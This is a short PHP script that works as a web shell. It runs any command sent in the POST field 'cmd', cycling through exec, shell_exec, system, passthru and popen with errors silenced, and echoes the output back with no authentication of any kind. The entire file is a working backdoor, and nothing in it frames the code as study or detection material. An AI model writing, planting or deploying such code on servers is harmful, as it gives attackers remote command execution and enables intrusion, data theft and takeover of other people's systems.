<?php
function Exec_Run($cmd)
{
	$res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	return $res;
}

if(!empty($_POST['cmd'])){
	$res = Exec_Run($_POST['cmd']);
	echo $res;
}
?>